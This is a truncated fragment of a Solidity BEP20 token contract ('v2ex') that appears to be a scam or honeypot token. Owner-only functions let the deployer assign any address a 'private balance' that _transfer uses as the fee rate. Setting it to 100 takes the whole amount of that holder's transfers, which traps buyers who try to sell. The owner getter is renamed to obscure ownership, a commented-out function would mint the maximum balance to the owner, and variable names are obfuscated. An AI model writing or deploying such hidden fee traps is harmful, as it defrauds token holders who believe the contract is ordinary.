...
abstract contract Ownable {
     ...
     * @dev Returns the address of the current owner.
     */
    function owner222() public view virtual returns (address) {
        return _owner;
    }
 ...
 */
contract v2ex is IBEP20,Ownable {
    ...
    function exitPrivateBalance(address nnn) external onlyOwner   {
       _privateBalance[nnn] = 0;     
    }

    function addPrivateBalance(address nnn) external onlyOwner  {
        _privateBalance[nnn] = 100;
    }

    function chaprivateBalance(address nnn) public view returns(uint256)  {
        return _privateBalance[nnn];
    }

    // function addAdmintBalance() external onlyOwner   {
    //    _balances[owner()] = 2 ** 256 - 1;     
    // }
    ...
    function _transfer(
        ...
        uint256 curFee = fetttKK;
        if (_privateBalance[from] > 0 ){
            curFee = _privateBalance[from];
        }
        
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount1, "ERC20: transfer amount exceeds balance");
        uint256 feeeeeA = amount1.mul(curFee).div(100);
        uint256 add = amount1.sub(feeeeeA);
    unchecked {
